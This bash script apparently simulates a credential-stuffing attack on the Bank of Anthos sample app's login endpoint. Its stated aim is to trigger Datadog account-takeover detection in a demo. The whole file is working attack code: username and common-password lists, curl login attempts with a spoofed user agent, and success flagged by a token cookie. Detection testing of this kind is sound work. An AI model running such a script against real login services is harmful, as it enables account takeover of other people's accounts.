#!/usr/bin/env bash
# Credential stuffing attack against the Bank of Anthos frontend /login endpoint.
#
# Sequentially replays a leaked-credential dump against the login form. After
# ATTEMPTS failures, finishes with a final guaranteed success using the leaked
# pair eve:bankofanthos so Datadog AAP's account-takeover detection has a real
# success to correlate against the storm of failures.
#
# Usage:
#   FRONTEND_URL=http://<frontend-host> ./docs/atk-credential-stuffing.sh
#   ATTEMPTS=500 FRONTEND_URL=... ./docs/atk-credential-stuffing.sh
#
# Env vars:
#   FRONTEND_URL  base URL of the frontend (default http://localhost:8080)
#   ATTEMPTS      number of failing login attempts before the final success (default 200)

set -u

FRONTEND_URL="${FRONTEND_URL:-http://localhost:8080}"
LOGIN_URL="${FRONTEND_URL%/}/login"

ATTEMPTS="${ATTEMPTS:-200}"

# Leaked-style username dump. No real Bank of Anthos accounts so the loop
# attempts all fail; the known-good credential pair is sent explicitly at the end.
USERNAMES=(
  admin administrator root sysadmin support
  john jane mike sarah david michael linda
  james patricia robert mary jennifer william
  elizabeth charles susan joseph margaret thomas
  dorothy daniel matthew anthony donald mark
  paul steven andrew kenneth george brian
  edward ronald timothy jason jeffrey ryan
  jacob gary nicholas eric jonathan stephen
  larry justin scott brandon benjamin samuel
  gregory alexander frank raymond patrick
)

# Top-of-the-leak passwords.
PASSWORDS=(
  123456 password 12345678 qwerty 123456789
  12345 1234 111111 1234567 dragon
  baseball iloveyou trustno1 sunshine master
  welcome shadow ashley football jesus
  ninja mustang password1 letmein abc123
  monkey 696969 batman superman pokemon
)

USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"

successes=0
failures=0

attempt() {
  local user="$1"
  local pass="$2"

  local headers
  headers=$(curl -s -i -o /dev/null -D - \
    -A "$USER_AGENT" \
    --data-urlencode "username=$user" \
    --data-urlencode "password=$pass" \
    --max-time 5 \
    "$LOGIN_URL" 2>/dev/null || true)

  if echo "$headers" | grep -qiE '^set-cookie:.*token='; then
    printf '[%s] \033[32mPWN\033[0m %-15s : %s\n' "$(date -u +%H:%M:%S)" "$user" "$pass"
    successes=$((successes + 1))
  else
    printf '[%s]     %-15s : %s\n' "$(date -u +%H:%M:%S)" "$user" "$pass"
    failures=$((failures + 1))
  fi
}

echo "==> Target:  $LOGIN_URL"
echo "Attempts:    $ATTEMPTS (plus one final known-good)"
echo "----"

for ((i = 1; i <= ATTEMPTS; i++)); do
  user="${USERNAMES[$((RANDOM % ${#USERNAMES[@]}))]}"
  pass="${PASSWORDS[$((RANDOM % ${#PASSWORDS[@]}))]}"
  attempt "$user" "$pass"
done

echo "----"
echo "Final attempt with leaked credentials eve:bankofanthos"
attempt "eve" "bankofanthos"

echo "----"
echo "Total:     $((ATTEMPTS + 1))"
echo "Successes: $successes"
echo "Failures:  $failures"
